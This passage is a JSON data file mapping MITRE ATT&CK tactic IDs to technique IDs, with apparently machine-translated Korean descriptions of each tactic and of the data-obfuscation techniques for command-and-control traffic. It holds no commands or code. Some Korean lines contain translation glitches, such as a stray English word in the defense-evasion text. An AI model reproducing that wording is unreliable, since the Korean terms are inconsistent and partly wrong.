{
  "tactic_technique": {
    "TA0001": [
      "T1133",
      "T1195.001",
      "T1192",
      "T1566.002",
      "T1566.001",
      "T1195.003",
      "T1091",
      "T1195",
      "T1190",
      "T1659",
      "T1078.001",
      "T1193",
      "T1199",
      "T1566",
      "T1078",
      "T1566.004",
      "T1195.002",
      "T1078.002",
      "T1194",
      "T1200",
      "T1189",
      "T1078.004",
      "T1566.003",
      "T1078.003"
    ],
    "TA0002": [
      "T1053.005",
      "T1047",
      "T1129",
      "T1059.007",
      "T1053.007",
      "T1121",
      "T1559.002",
      "T1204.002",
      "T1053.003",
      "T1559.001",
      "T1053",
      "T1059.002",
      "T1106",
      "T1059.010",
      "T1153",
      "T1152",
      "T1059.009",
      "T1610",
      "T1155",
      "T1085",
      "T1053.001",
      "T1117",
      "T1177",
      "T1059",
      "T1175",
      "T1609",
      "T1191",
      "T1064",
      "T1569.001",
      "T1059.008",
      "T1559.003",
      "T1204",
      "T1196",
      "T1053.004",
      "T1072",
      "T1059.001",
      "T1170",
      "T1053.006",
      "T1061",
      "T1059.004",
      "T1559",
      "T1059.011",
      "T1204.003",
      "T1154",
      "T1203",
      "T1168",
      "T1028",
      "T1059.006",
      "T1569",
      "T1059.003",
      "T1223",
      "T1651",
      "T1059.005",
      "T1151",
      "T1648",
      "T1173",
      "T1204.001",
      "T1569.002",
      "T1053.002",
      "T1035",
      "T1086",
      "T1118"
    ],
    "TA0003": [
      "T1053.005",
      "T1205.002",
      "T1156",
      "T1067",
      "T1037",
      "T1161",
      "T1150",
      "T1556.003",
      "T1574.007",
      "T1044",
      "T1546.013",
      "T1501",
      "T1543",
      "T1133",
      "T1109",
      "T1546.006",
      "T1053.007",
      "T1542.001",
      "T1574.011",
      "T1163",
      "T1542.003",
      "T1547",
      "T1013",
      "T1547.014",
      "T1180",
      "T1542.005",
      "T1543.003",
      "T1053.003",
      "T1165",
      "T1137",
      "T1098.003",
      "T1547.012",
      "T1574.001",
      "T1103",
      "T1137.006",
      "T1505.002",
      "T1574.014",
      "T1098.006",
      "T1053",
      "T1162",
      "T1556.002",
      "T1505.005",
      "T1176",
      "T1058",
      "T1137.005",
      "T1098.007",
      "T1546.011",
      "T1547.010",
      "T1037.002",
      "T1205",
      "T1038",
      "T1050",
      "T1547.009",
      "T1062",
      "T1182",
      "T1525",
      "T1547.005",
      "T1004",
      "T1131",
      "T1152",
      "T1556.007",
      "T1543.004",
      "T1574.008",
      "T1505.003",
      "T1078.001",
      "T1547.003",
      "T1183",
      "T1031",
      "T1546.005",
      "T1574.006",
      "T1136.001",
      "T1053.001",
      "T1179",
      "T1547.011",
      "T1547.004",
      "T1019",
      "T1042",
      "T1164",
      "T1108",
      "T1098.004",
      "T1215",
      "T1101",
      "T1546.012",
      "T1177",
      "T1574.005",
      "T1546.008",
      "T1504",
      "T1198",
      "T1136.002",
      "T1542.002",
      "T1137.001",
      "T1138",
      "T1546.009",
      "T1098.005",
      "T1542",
      "T1547.015",
      "T1205.001",
      "T1098.001",
      "T1053.004",
      "T1556.008",
      "T1546.003",
      "T1060",
      "T1554",
      "T1023",
      "T1546.001",
      "T1122",
      "T1015",
      "T1546.014",
      "T1574.010",
      "T1547.001",
      "T1136.003",
      "T1098",
      "T1547.006",
      "T1574.013",
      "T1053.006",
      "T1542.004",
      "T1137.003",
      "T1157",
      "T1574",
      "T1543.005",
      "T1078",
      "T1556.006",
      "T1505.004",
      "T1154",
      "T1546",
      "T1546.004",
      "T1547.002",
      "T1128",
      "T1546.015",
      "T1137.004",
      "T1574.009",
      "T1168",
      "T1166",
      "T1037.005",
      "T1100",
      "T1078.002",
      "T1034",
      "T1037.003",
      "T1197",
      "T1546.010",
      "T1546.002",
      "T1556.009",
      "T1543.001",
      "T1519",
      "T1505",
      "T1556.001",
      "T1556.005",
      "T1546.016",
      "T1158",
      "T1037.004",
      "T1209",
      "T1159",
      "T1543.002",
      "T1136",
      "T1547.013",
      "T1547.007",
      "T1574.002",
      "T1098.002",
      "T1084",
      "T1160",
      "T1653",
      "T1037.001",
      "T1137.002",
      "T1547.008",
      "T1078.004",
      "T1053.002",
      "T1556",
      "T1546.017",
      "T1546.007",
      "T1505.001",
      "T1556.004",
      "T1574.004",
      "T1078.003",
      "T1574.012"
    ],
    "TA0004": [
      "T1055.011",
      "T1053.005",
      "T1037",
      "T1150",
      "T1574.007",
      "T1044",
      "T1546.013",
      "T1514",
      "T1543",
      "T1546.006",
      "T1053.007",
      "T1548.002",
      "T1548.003",
      "T1574.011",
      "T1178",
      "T1547",
      "T1013",
      "T1206",
      "T1547.014",
      "T1484.002",
      "T1543.003",
      "T1053.003",
      "T1165",
      "T1098.003",
      "T1547.012",
      "T1574.001",
      "T1103",
      "T1574.014",
      "T1098.006",
      "T1053",
      "T1058",
      "T1098.007",
      "T1055.003",
      "T1546.011",
      "T1547.010",
      "T1037.002",
      "T1055",
      "T1038",
      "T1050",
      "T1611",
      "T1547.009",
      "T1182",
      "T1547.005",
      "T1181",
      "T1543.004",
      "T1574.008",
      "T1484.001",
      "T1078.001",
      "T1547.003",
      "T1183",
      "T1546.005",
      "T1574.006",
      "T1053.001",
      "T1179",
      "T1547.011",
      "T1548",
      "T1134.002",
      "T1548.001",
      "T1547.004",
      "T1098.004",
      "T1546.012",
      "T1548.005",
      "T1055.013",
      "T1574.005",
      "T1546.008",
      "T1504",
      "T1055.004",
      "T1138",
      "T1546.009",
      "T1098.005",
      "T1055.002",
      "T1547.015",
      "T1134.001",
      "T1098.001",
      "T1134.003",
      "T1053.004",
      "T1546.003",
      "T1134.004",
      "T1546.001",
      "T1055.014",
      "T1015",
      "T1546.014",
      "T1502",
      "T1169",
      "T1574.010",
      "T1547.001",
      "T1098",
      "T1547.006",
      "T1574.013",
      "T1053.006",
      "T1157",
      "T1574",
      "T1543.005",
      "T1078",
      "T1055.012",
      "T1068",
      "T1546",
      "T1546.004",
      "T1134.005",
      "T1548.004",
      "T1547.002",
      "T1546.015",
      "T1574.009",
      "T1166",
      "T1037.005",
      "T1100",
      "T1078.002",
      "T1034",
      "T1037.003",
      "T1088",
      "T1546.010",
      "T1546.002",
      "T1543.001",
      "T1055.009",
      "T1519",
      "T1546.016",
      "T1037.004",
      "T1134",
      "T1543.002",
      "T1547.013",
      "T1055.005",
      "T1547.007",
      "T1574.002",
      "T1098.002",
      "T1548.006",
      "T1160",
      "T1055.008",
      "T1037.001",
      "T1055.015",
      "T1484",
      "T1547.008",
      "T1078.004",
      "T1053.002",
      "T1055.001",
      "T1546.017",
      "T1546.007",
      "T1574.004",
      "T1078.003",
      "T1574.012"
    ],
    "TA0005": [
      "T1055.011",
      "T1205.002",
      "T1066",
      "T1027.011",
      "T1218.011",
      "T1143",
      "T1027.009",
      "T1150",
      "T1556.003",
      "T1578.004",
      "T1148",
      "T1564.012",
      "T1222.002",
      "T1216.001",
      "T1574.007",
      "T1006",
      "T1666",
      "T1564.008",
      "T1027.013",
      "T1014",
      "T1109",
      "T1036.007",
      "T1548.002",
      "T1099",
      "T1548.003",
      "T1578",
      "T1542.001",
      "T1574.011",
      "T1542.003",
      "T1116",
      "T1218.013",
      "T1093",
      "T1036.005",
      "T1600",
      "T1036.008",
      "T1121",
      "T1564",
      "T1484.002",
      "T1527",
      "T1562.009",
      "T1542.005",
      "T1497.001",
      "T1070.002",
      "T1218.004",
      "T1089",
      "T1027.008",
      "T1574.001",
      "T1553.001",
      "T1553.002",
      "T1036.009",
      "T1222.001",
      "T1574.014",
      "T1218.007",
      "T1556.002",
      "T1070.007",
      "T1600.001",
      "T1070.003",
      "T1202",
      "T1536",
      "T1140",
      "T1562",
      "T1055.003",
      "T1036",
      "T1070.008",
      "T1055",
      "T1205",
      "T1218",
      "T1038",
      "T1070.006",
      "T1620",
      "T1480.002",
      "T1564.011",
      "T1497.003",
      "T1218.003",
      "T1562.002",
      "T1218.002",
      "T1599.001",
      "T1009",
      "T1550",
      "T1181",
      "T1562.004",
      "T1152",
      "T1553.003",
      "T1556.007",
      "T1218.015",
      "T1562.012",
      "T1207",
      "T1553.006",
      "T1610",
      "T1107",
      "T1112",
      "T1574.008",
      "T1535",
      "T1027.001",
      "T1484.001",
      "T1078.001",
      "T1183",
      "T1085",
      "T1574.006",
      "T1070.001",
      "T1222",
      "T1548",
      "T1134.002",
      "T1548.001",
      "T1117",
      "T1054",
      "T1108",
      "T1218.008",
      "T1548.005",
      "T1144",
      "T1045",
      "T1055.013",
      "T1578.003",
      "T1574.005",
      "T1198",
      "T1562.006",
      "T1562.007",
      "T1036.002",
      "T1542.002",
      "T1070",
      "T1550.003",
      "T1036.004",
      "T1055.004",
      "T1647",
      "T1191",
      "T1553.005",
      "T1600.002",
      "T1542",
      "T1064",
      "T1612",
      "T1055.002",
      "T1218.012",
      "T1562.010",
      "T1497",
      "T1218.005",
      "T1480",
      "T1134.001",
      "T1205.001",
      "T1027.012",
      "T1564.002",
      "T1134.003",
      "T1196",
      "T1562.003",
      "T1556.008",
      "T1497.002",
      "T1134.004",
      "T1055.014",
      "T1122",
      "T1502",
      "T1574.010",
      "T1149",
      "T1170",
      "T1574.013",
      "T1542.004",
      "T1218.001",
      "T1070.005",
      "T1562.001",
      "T1601",
      "T1574",
      "T1027.005",
      "T1078",
      "T1073",
      "T1055.012",
      "T1564.009",
      "T1027",
      "T1556.006",
      "T1036.001",
      "T1564.006",
      "T1027.014",
      "T1134.005",
      "T1599",
      "T1553",
      "T1548.004",
      "T1218.010",
      "T1036.003",
      "T1562.011",
      "T1574.009",
      "T1186",
      "T1027.003",
      "T1550.004",
      "T1078.002",
      "T1218.009",
      "T1506",
      "T1553.004",
      "T1027.004",
      "T1564.007",
      "T1197",
      "T1127.001",
      "T1656",
      "T1578.005",
      "T1088",
      "T1562.008",
      "T1564.003",
      "T1127.002",
      "T1070.010",
      "T1147",
      "T1556.009",
      "T1578.002",
      "T1500",
      "T1055.009",
      "T1223",
      "T1601.001",
      "T1070.009",
      "T1146",
      "T1036.010",
      "T1556.001",
      "T1027.006",
      "T1556.005",
      "T1027.010",
      "T1130",
      "T1070.004",
      "T1158",
      "T1221",
      "T1134",
      "T1027.002",
      "T1564.005",
      "T1151",
      "T1055.005",
      "T1622",
      "T1036.006",
      "T1550.002",
      "T1574.002",
      "T1216.002",
      "T1126",
      "T1548.006",
      "T1055.008",
      "T1027.007",
      "T1055.015",
      "T1484",
      "T1220",
      "T1564.001",
      "T1578.001",
      "T1550.001",
      "T1078.004",
      "T1480.001",
      "T1564.004",
      "T1096",
      "T1055.001",
      "T1556",
      "T1216",
      "T1118",
      "T1556.004",
      "T1574.004",
      "T1601.002",
      "T1078.003",
      "T1211",
      "T1127",
      "T1218.014",
      "T1564.010",
      "T1574.012"
    ],
    "TA0006": [
      "T1557",
      "T1556.003",
      "T1056.001",
      "T1110.001",
      "T1003",
      "T1171",
      "T1539",
      "T1003.002",
      "T1552.005",
      "T1555.002",
      "T1522",
      "T1110.002",
      "T1555.001",
      "T1003.004",
      "T1606.002",
      "T1167",
      "T1214",
      "T1003.007",
      "T1555.005",
      "T1040",
      "T1552.002",
      "T1556.002",
      "T1558.005",
      "T1558.004",
      "T1558",
      "T1555",
      "T1552",
      "T1139",
      "T1503",
      "T1557.004",
      "T1556.007",
      "T1145",
      "T1555.003",
      "T1557.003",
      "T1552.004",
      "T1557.001",
      "T1003.001",
      "T1179",
      "T1110.003",
      "T1056.003",
      "T1003.005",
      "T1558.001",
      "T1649",
      "T1552.003",
      "T1552.001",
      "T1606.001",
      "T1528",
      "T1552.006",
      "T1556.008",
      "T1141",
      "T1606",
      "T1621",
      "T1552.008",
      "T1212",
      "T1142",
      "T1056.002",
      "T1110",
      "T1110.004",
      "T1208",
      "T1556.006",
      "T1187",
      "T1174",
      "T1081",
      "T1056",
      "T1557.002",
      "T1556.009",
      "T1555.006",
      "T1003.008",
      "T1558.002",
      "T1555.004",
      "T1556.001",
      "T1556.005",
      "T1111",
      "T1003.003",
      "T1558.003",
      "T1003.006",
      "T1556",
      "T1056.004",
      "T1552.007",
      "T1556.004"
    ],
    "TA0007": [
      "T1033",
      "T1613",
      "T1016.001",
      "T1069",
      "T1069.003",
      "T1615",
      "T1652",
      "T1087.002",
      "T1063",
      "T1087.001",
      "T1497.001",
      "T1069.002",
      "T1007",
      "T1040",
      "T1135",
      "T1120",
      "T1082",
      "T1016.002",
      "T1010",
      "T1087.003",
      "T1497.003",
      "T1580",
      "T1217",
      "T1016",
      "T1087",
      "T1482",
      "T1083",
      "T1049",
      "T1497",
      "T1619",
      "T1654",
      "T1087.004",
      "T1057",
      "T1497.002",
      "T1069.001",
      "T1201",
      "T1614.001",
      "T1012",
      "T1614",
      "T1518.001",
      "T1526",
      "T1018",
      "T1046",
      "T1518",
      "T1538",
      "T1622",
      "T1124"
    ],
    "TA0008": [
      "T1021.005",
      "T1080",
      "T1527",
      "T1021.004",
      "T1017",
      "T1091",
      "T1021.008",
      "T1563.001",
      "T1021.002",
      "T1550",
      "T1076",
      "T1021",
      "T1563",
      "T1021.006",
      "T1021.003",
      "T1175",
      "T1550.003",
      "T1051",
      "T1021.007",
      "T1072",
      "T1210",
      "T1534",
      "T1097",
      "T1570",
      "T1184",
      "T1075",
      "T1028",
      "T1550.004",
      "T1506",
      "T1563.002",
      "T1550.002",
      "T1021.001",
      "T1550.001",
      "T1077"
    ],
    "TA0009": [
      "T1560.001",
      "T1113",
      "T1557",
      "T1056.001",
      "T1602",
      "T1213.002",
      "T1123",
      "T1560.003",
      "T1114",
      "T1025",
      "T1074.001",
      "T1114.001",
      "T1119",
      "T1115",
      "T1530",
      "T1074.002",
      "T1005",
      "T1560.002",
      "T1557.004",
      "T1602.002",
      "T1560",
      "T1185",
      "T1557.003",
      "T1557.001",
      "T1056.003",
      "T1125",
      "T1213.001",
      "T1114.003",
      "T1074",
      "T1056.002",
      "T1039",
      "T1114.002",
      "T1056",
      "T1213.004",
      "T1557.002",
      "T1213.003",
      "T1213",
      "T1602.001",
      "T1056.004",
      "T1213.005"
    ],
    "TA0010": [
      "T1567",
      "T1567.004",
      "T1029",
      "T1011",
      "T1011.001",
      "T1020",
      "T1048.001",
      "T1020.001",
      "T1567.001",
      "T1048.002",
      "T1041",
      "T1048",
      "T1052.001",
      "T1002",
      "T1567.003",
      "T1567.002",
      "T1030",
      "T1537",
      "T1022",
      "T1052",
      "T1048.003"
    ],
    "TA0011": [
      "T1205.002",
      "T1132.001",
      "T1568.002",
      "T1071.004",
      "T1172",
      "T1071.005",
      "T1573.001",
      "T1568.001",
      "T1071",
      "T1024",
      "T1219",
      "T1079",
      "T1659",
      "T1205",
      "T1032",
      "T1572",
      "T1483",
      "T1071.003",
      "T1092",
      "T1090.002",
      "T1090",
      "T1568",
      "T1188",
      "T1102",
      "T1568.003",
      "T1104",
      "T1205.001",
      "T1026",
      "T1071.002",
      "T1102.003",
      "T1090.003",
      "T1001",
      "T1571",
      "T1573",
      "T1102.002",
      "T1573.002",
      "T1095",
      "T1001.003",
      "T1065",
      "T1090.004",
      "T1132",
      "T1132.002",
      "T1071.001",
      "T1105",
      "T1665",
      "T1001.002",
      "T1008",
      "T1090.001",
      "T1094",
      "T1102.001",
      "T1001.001",
      "T1043"
    ],
    "TA0040": [
      "T1561.002",
      "T1498.001",
      "T1492",
      "T1491.002",
      "T1499.001",
      "T1485.001",
      "T1496.003",
      "T1499.003",
      "T1561",
      "T1565.001",
      "T1489",
      "T1499.004",
      "T1487",
      "T1565.003",
      "T1498.002",
      "T1499.002",
      "T1491",
      "T1496.002",
      "T1657",
      "T1491.001",
      "T1496.004",
      "T1496.001",
      "T1565",
      "T1531",
      "T1486",
      "T1488",
      "T1499",
      "T1494",
      "T1493",
      "T1496",
      "T1565.002",
      "T1485",
      "T1498",
      "T1495",
      "T1490",
      "T1561.001",
      "T1529"
    ],
    "TA0042": [
      "T1583",
      "T1583.007",
      "T1588.007",
      "T1584.008",
      "T1583.008",
      "T1588.004",
      "T1583.002",
      "T1587.003",
      "T1587.001",
      "T1586.001",
      "T1588.006",
      "T1583.005",
      "T1608.004",
      "T1587.002",
      "T1584.003",
      "T1586.003",
      "T1586.002",
      "T1608.001",
      "T1583.001",
      "T1608.002",
      "T1583.004",
      "T1585.002",
      "T1588.001",
      "T1583.003",
      "T1584",
      "T1586",
      "T1584.005",
      "T1608",
      "T1608.005",
      "T1583.006",
      "T1585.003",
      "T1588.002",
      "T1584.006",
      "T1585.001",
      "T1587.004",
      "T1608.003",
      "T1584.002",
      "T1585",
      "T1588",
      "T1650",
      "T1584.007",
      "T1584.004",
      "T1608.006",
      "T1588.003",
      "T1587",
      "T1588.005",
      "T1584.001"
    ],
    "TA0043": [
      "T1592",
      "T1596.003",
      "T1597.002",
      "T1590.005",
      "T1590.002",
      "T1596.002",
      "T1594",
      "T1596.001",
      "T1591.003",
      "T1592.001",
      "T1598.003",
      "T1590.004",
      "T1590.003",
      "T1597.001",
      "T1589",
      "T1595.002",
      "T1596",
      "T1595",
      "T1589.002",
      "T1598.004",
      "T1590.006",
      "T1593.002",
      "T1591.002",
      "T1593.003",
      "T1589.003",
      "T1592.004",
      "T1598.002",
      "T1596.004",
      "T1591",
      "T1590",
      "T1593",
      "T1597",
      "T1592.003",
      "T1592.002",
      "T1593.001",
      "T1589.001",
      "T1595.003",
      "T1591.004",
      "T1598",
      "T1595.001",
      "T1590.001",
      "T1596.005",
      "T1591.001",
      "T1598.001"
    ]
  },
  "tactics": [
    {
      "description": "적대자는 귀하의 네트워크에 침투하려고 하고 있습니다.\n\n초기 접근(Initial Access)은 네트워크 내에서 첫 발판을 마련하기 위해 다양한 진입 경로를 사용하는 기술들로 구성됩니다. 발판을 얻기 위해 사용되는 기술에는 표적을 겨냥한 스피어 피싱(spearphishing)과 공개 웹 서버의 취약점을 악용하는 방법이 포함됩니다. 초기 접근을 통해 얻어진 발판은 유효한 계정과 외부 원격 서비스의 사용과 같은 지속적인 접근을 허용할 수 있으며, 비밀번호 변경과 같은 이유로 제한적인 사용이 될 수도 있습니다.",
      "external_id": "TA0001",
      "modified": "2019-07-19T17:41:41.425Z",
      "title": "Initial Access",
      "translated": true
    },
    {
      "description": "적 대적자는 악성 코드를 실행하려고 하고 있습니다.\n\n실행 단계는 적이 제어하는 코드가 로컬 또는 원격 시스템에서 실행되도록 하는 기술로 구성됩니다. 악성 코드를 실행하는 기술은 네트워크 탐색이나 데이터 탈취와 같은 더 넓은 목표를 달성하기 위해 다른 모든 전술의 기술과 짝을 이루는 경우가 많습니다. 예를 들어, 적은 원격 액세스 도구를 사용하여 원격 시스템 탐색을 수행하는 PowerShell 스크립트를 실행할 수 있습니다.",
      "external_id": "TA0002",
      "modified": "2019-07-19T17:42:06.909Z",
      "title": "Execution",
      "translated": true
    },
    {
      "description": "위협자는 발판을 유지하려고 합니다.\n\n지속성은 위협자가 시스템에 대한 접근을 유지하기 위해 재시작, 변경된 자격 증명 및 접근을 차단할 수 있는 기타 중단 상황에도 불구하고 사용하는 기법을 포함합니다. 지속성을 위한 기법에는 합법적인 코드를 교체하거나 탈취하거나 시작 코드를 추가하는 등 시스템에서 발판을 유지할 수 있도록 하는 모든 접근, 행동 또는 구성 변경이 포함됩니다.",
      "external_id": "TA0003",
      "modified": "2019-07-19T17:42:33.899Z",
      "title": "Persistence",
      "translated": true
    },
    {
      "description": "공격자는 더 높은 수준의 권한을 얻으려고 하고 있습니다.\n\n권한 상승(Privilege Escalation)은 공격자가 시스템 또는 네트워크에서 더 높은 수준의 권한을 얻기 위해 사용하는 기법입니다. 공격자는 종종 비권한 접근으로 네트워크에 침투하고 탐색할 수 있지만, 목표를 달성하기 위해서는 권한 상승이 필요합니다. 일반적인 접근 방법은 시스템의 취약점, 잘못된 구성 및 보안 취약점을 악용하는 것입니다. 상승된 접근 권한의 예는 다음과 같습니다:\n\n* SYSTEM/루트 수준\n* 로컬 관리자인 경우\n* 관리자와 유사한 접근 권한이 있는 사용자 계정\n* 특정 시스템에 접근하거나 특정 기능을 수행할 수 있는 사용자 계정\n\n이러한 기법은 지속성(Persistence) 기법과 종종 겹치는데, 공격자가 지속적으로 존재하기 위해 사용할 수 있는 OS 기능이 상승된 컨텍스트에서 실행될 수 있기 때문입니다.",
      "external_id": "TA0004",
      "modified": "2021-01-06T14:21:21.641Z",
      "title": "Privilege Escalation",
      "translated": true
    },
    {
      "description": "적대자는 탐지를 피하려고 합니다.\n\n방어 회피(Defense Evasion)는 적대자가 공격 과정에서 탐지를 피하기 위해 사용하는 기법들을 포함합니다. 방어 회피에 사용되는 기술에는 보안 소프트웨어 제거/비활성화하거나 데이터 및 스크립트를 난독화/암호화하는 방법이 있습니다. 적대자는 신뢰할 수 있는 프로세스를 이용하고 남용하여 자신의 악성 코드를 숨기고 변 disguise시키기도 합니다. 다른 전술의 기술들은 이곳에 나열되어 있으며, 이는 해당 기술들이 방어를 무력화하는 추가 혜택을 포함할 때 해당됩니다.",
      "external_id": "TA0005",
      "modified": "2019-07-19T17:43:23.473Z",
      "title": "Defense Evasion",
      "translated": true
    },
    {
      "description": "적대자는 계정 이름과 비밀번호를 훔치려고 시도하고 있습니다.\n\n자격 증명 접근(Credential Access)은 계정 이름과 비밀번호와 같은 자격 증명을 훔치기 위한 기술로 구성됩니다. 자격 증명을 얻기 위해 사용되는 기술에는 키로깅(keylogging)이나 자격 증명 덤핑(credential dumping)이 포함됩니다. 합법적인 자격 증명을 사용하면 적대자는 시스템에 접근할 수 있게 되고, 탐지를 더 어렵게 만들며, 목표 달성을 돕기 위해 더 많은 계정을 생성할 수 있는 기회를 제공합니다.",
      "external_id": "TA0006",
      "modified": "2019-07-19T17:43:41.967Z",
      "title": "Credential Access",
      "translated": true
    },
    {
      "description": "공격자는 귀하의 환경을 파악하려고 합니다.\n\n탐색(Discovery)은 공격자가 시스템 및 내부 네트워크에 대한 정보를 얻기 위해 사용할 수 있는 기술로 구성됩니다. 이러한 기술은 공격자가 환경을 관찰하고 행동을 결정하기 전에 자신의 위치를 파악하는 데 도움을 줍니다. 또한 공격자가 자신의 진입 지점 주변에서 제어할 수 있는 것과 주변 환경을 탐색할 수 있게 하여 현재 목표에 어떻게 도움이 될 수 있는지를 발견할 수 있도록 합니다. 이러한 사후 공격 정보 수집 목표를 위해 종종 기본 운영 체제 도구가 사용됩니다.",
      "external_id": "TA0007",
      "modified": "2019-07-19T17:44:13.228Z",
      "title": "Discovery",
      "translated": true
    },
    {
      "description": "적대자는 귀하의 환경 내에서 이동하려고 시도하고 있습니다.\n\n측면 이동(Lateral Movement)은 적대자가 네트워크의 원격 시스템에 접근하고 제어하기 위해 사용하는 기술을 포함합니다. 그들의 주요 목표를 달성하기 위해 종종 네트워크를 탐색하여 목표를 찾고 이에 접근해야 합니다. 목표에 도달하기 위해서는 여러 시스템과 계정을 통해 피벗(pivoting)하는 과정이 필요할 수 있습니다. 적대자는 측면 이동을 수행하기 위해 자신의 원격 접근 도구를 설치하거나, 더 은밀하게 작업할 수 있는 네트워크 및 운영 체제 도구를 활용하여 합법적인 자격 증명을 사용할 수 있습니다.",
      "external_id": "TA0008",
      "modified": "2019-07-19T17:44:36.953Z",
      "title": "Lateral Movement",
      "translated": true
    },
    {
      "description": "적대자는 자신의 목표와 관련된 정보를 수집하려고 합니다.\n\n수집(Collection)은 적대자가 정보를 수집하기 위해 사용할 수 있는 기술과 적대자의 목표를 달성하는 데 관련된 정보의 출처를 포함합니다. 데이터를 수집한 후의 일반적인 목표는 데이터를 훔치거나(유출) 데이터를 사용하여 표적 환경에 대한 추가 정보를 얻는 것입니다. 일반적인 표적 출처에는 다양한 드라이브 유형, 브라우저, 오디오, 비디오, 이메일 등이 포함됩니다. 일반적인 수집 방법에는 스크린샷 캡처 및 키보드 입력 기록이 포함됩니다.",
      "external_id": "TA0009",
      "modified": "2024-09-05T18:27:09.070Z",
      "title": "Collection",
      "translated": true
    },
    {
      "description": "적대자는 데이터를 탈취하려고 합니다.\n\n탈출(Exfiltration)은 적대자가 귀하의 네트워크에서 데이터를 훔치는 데 사용할 수 있는 기법들로 구성됩니다. 데이터를 수집한 후, 적대자는 종종 탐지를 피하기 위해 데이터를 포장합니다. 이는 압축 및 암호화를 포함할 수 있습니다. 대상 네트워크에서 데이터를 빼내는 기법은 일반적으로 그들의 명령 및 제어 채널이나 대체 채널을 통해 전송하는 것을 포함하며, 전송 크기에 대한 제한을 두는 것 또한 포함될 수 있습니다.",
      "external_id": "TA0010",
      "modified": "2019-07-19T17:45:12.806Z",
      "title": "Exfiltration",
      "translated": true
    },
    {
      "description": "적대자는 손상된 시스템과 통신하여 제어하려고 합니다.\n\n명령 및 제어(Command and Control)는 적대자가 피해자 네트워크 내에서 통제하는 시스템과 통신하는 데 사용할 수 있는 기술을 포함합니다. 적대자들은 일반적으로 탐지를 피하기 위해 정상적이고 예상되는 트래픽을 모방하려고 합니다. 적대자가 피해자의 네트워크 구조와 방어 태세에 따라 다양한 수준의 은폐로 명령 및 제어를 구축할 수 있는 방법은 여러 가지가 있습니다.",
      "external_id": "TA0011",
      "modified": "2019-07-19T17:45:30.644Z",
      "title": "Command and Control",
      "translated": true
    },
    {
      "description": "적대자는 귀하의 시스템과 데이터를 조작, 중단 또는 파괴하려고 하고 있습니다.\n\n영향은 적대자가 가용성을 방해하거나 무결성을 손상시키기 위해 비즈니스 및 운영 프로세스를 조작하는 데 사용하는 기술로 구성됩니다. 영향을 미치는 데 사용되는 기술에는 데이터의 파괴 또는 변조가 포함될 수 있습니다. 경우에 따라 비즈니스 프로세스는 정상적으로 보일 수 있지만, 적대자의 목표를 달성하기 위해 변경되었을 수 있습니다. 이러한 기술은 적대자가 최종 목표를 달성하거나 기밀 유출에 대한 은폐를 제공하기 위해 사용할 수 있습니다.",
      "external_id": "TA0040",
      "modified": "2019-07-25T18:42:23.222Z",
      "title": "Impact",
      "translated": true
    },
    {
      "description": "적대자는 작전을 지원할 수 있는 자원을 구축하려고 하고 있습니다.\n\n자원 개발(Resource Development)은 적대자가 목표를 지원하기 위해 사용할 수 있는 자원을 생성, 구매 또는 손상/도용하는 기술을 포함합니다. 이러한 자원에는 인프라, 계정 또는 기능이 포함됩니다. 이러한 자원은 적대자가 적대자 생애주기의 다른 단계에서 도움을 주는 데 활용될 수 있습니다. 예를 들어, 구매한 도메인을 사용하여 명령 및 제어(Command and Control)를 지원하거나, 초기 액세스의 일환으로 피싱을 위한 이메일 계정을 사용하거나, 방어 회피(Defense Evasion)를 돕기 위해 코드 서명 인증서를 도용하는 것입니다.",
      "external_id": "TA0042",
      "modified": "2020-09-30T16:31:36.322Z",
      "title": "Resource Development",
      "translated": true
    },
    {
      "description": "적대자는 향후 작전을 계획하는 데 사용할 수 있는 정보를 수집하려고 합니다.\n\n정찰 단계는 적대자가 목표를 지원하기 위해 적극적 또는 수동적으로 정보를 수집하는 기술로 구성됩니다. 이러한 정보에는 피해 조직, 인프라 또는 직원의 세부사항이 포함될 수 있습니다. 적대자는 이 정보를 활용하여 적대자 생애 주기의 다른 단계에서 도움이 될 수 있습니다. 예를 들어, 수집한 정보를 사용하여 초기 접근을 계획하고 실행하거나, 후속 손상 후 목표를 범위 지정하고 우선 순위를 정하거나, 추가 정찰 노력을 추진하고 이끌어 갈 수 있습니다.",
      "external_id": "TA0043",
      "modified": "2020-10-18T02:04:50.842Z",
      "title": "Reconnaissance",
      "translated": true
    }
  ],
  "techniques": [
    {
      "description": "침략자들은 탐지를 어렵게 만들기 위해 명령 및 제어(C2) 트래픽을 은폐할 수 있습니다.(출처: Bitdefender FunnyDream 캠페인 2020년 11월) 명령 및 제어(C2) 통신은 내용이 발견되거나 해독되는 것을 어렵게 하기 위해 숨겨지지만 반드시 암호화되지는 않습니다. 이러한 통신은 덜 눈에 띄게 만들고 명령이 보이지 않도록 하기 위해 사용됩니다. 이에는 프로토콜 트래픽에 잡동사니 데이터를 추가하는 것, 스테가노그래피를 사용하는 것, 또는 합법적인 프로토콜을 가장하는 것과 같은 많은 방법이 포함됩니다.",
      "external_id": "T1001",
      "modified": "2024-10-07T15:07:47.232Z",
      "title": "Data Obfuscation",
      "translated": true
    },
    {
      "description": "적대자는 탐지를 더욱 어렵게 만들기 위해 명령 및 제어에 사용되는 프로토콜에 쓸모없는 데이터를 추가할 수 있습니다.(인용: FireEye SUNBURST 백도어 2020년 12월) 적대자가 명령 및 제어에 사용되는 프로토콜에 무작위 또는 의미 없는 데이터를 추가함으로써, 트래픽을 디코딩, 해독 또는 기타 분석하는 데 있어 진부한 방법을 예방할 수 있습니다. 예를 들어, 쓸모없는 문자로 데이터를 앞이나 뒤에 추가하거나 중요한 문자 사이에 쓸모없는 문자를 삽입하는 방법이 있습니다.",
      "external_id": "T1001.001",
      "modified": "2024-02-02T20:10:01.862Z",
      "title": "Junk Data",
      "translated": true
    },
    {
      "description": "적대자는 탐지 노력을 더욱 어렵게 만들기 위해 지배 및 통제 트래픽을 숨기기 위한 스테가노그래픽 기술을 사용할 수 있습니다. 스테가노그래픽 기술은 시스템 간에 전송되는 디지털 메시지 내에 데이터를 숨기는 데 사용될 수 있습니다. 이 숨겨진 정보는 손상된 시스템의 지배 및 통제에 사용될 수 있습니다. 경우에 따라 스테가노그래피를 사용하여 임베드된 파일(예: 이미지 또는 문서 파일)을 전달하는 것도 지배 및 통제를 위해 사용될 수 있습니다.",
      "external_id": "T1001.002",
      "modified": "2020-03-15T00:37:58.963Z",
      "title": "Steganography",
      "translated": true
    },
    {
